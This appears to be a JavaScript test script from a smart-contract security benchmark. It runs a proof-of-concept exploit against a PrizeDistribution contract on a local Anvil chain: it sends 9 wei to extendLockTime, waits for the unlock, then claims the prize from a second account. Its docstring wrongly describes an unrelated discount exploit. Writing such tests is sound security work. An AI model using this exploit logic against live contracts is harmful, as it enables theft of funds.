require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
let logger = require('@lib/logging/logger');



// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');

let source = fs.readFileSync(path.join(contractsDir, 'src', 'PrizeDistribution.sol'), 'utf8');

/**
 * Attempts to exploit a vulnerability in the PrizeDistribution smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    try {
        // Compile the contract to get ABI
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, 'PrizeDistribution', solcVersion);

        // Load the deployed contract
        let contractInstance = await new web3.eth.Contract(abi, contractAddress);

        // Using the first account (the organizer)
        let organizerAccount = envInfo.accounts[0];
        // Beneficiary account
        let beneficiaryAccount = envInfo.accounts[1];

        // Step 1: Send 9 wei to extendLockTime - this should not extend the unlock time significantly
        let extendTx = await contractInstance.methods.extendLockTime().send({
            from: organizerAccount,
            value: 9, // Sending 9 wei, below the BONUS_THRESHOLD
            gas: 300000
        });

        if (extendTx.status) {
            console.log("Step 1 transaction was successful!");

            // Get the unlockTime after extending
            let unlockTime = await contractInstance.methods.unlockTime().call();
            console.log("Updated unlock time:", unlockTime);

            // Wait until the unlockTime has passed
            let currentTime = Math.floor(Date.now() / 1000);
            if (currentTime < unlockTime) {
                let waitTime = unlockTime - currentTime + 10; // Add 10 second for safety
                console.log(`Waiting for ${waitTime} seconds until unlock time...`);
                await new Promise(resolve => setTimeout(resolve, waitTime * 1000));
            }

            // Step 2: Claim the prize using the beneficiary account
            let claimTx = await contractInstance.methods.claimPrize().send({
                from: beneficiaryAccount,
                gas: 300000
            });

            if (claimTx.status) {
                console.log("Step 2 transaction was successful!");
                return true; // Exploit successful
            } else {
                console.error("Step 2 transaction failed!");
                return false; // Exploit failed
            }
        } else {
            console.error("Step 1 transaction failed!");
            return false; // Exploit failed
        }
    } catch (error) {
        console.error(error.stack);
    }
}



/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
        logger.info(chalk.green("Exploit successful!"));

    return result; 
}
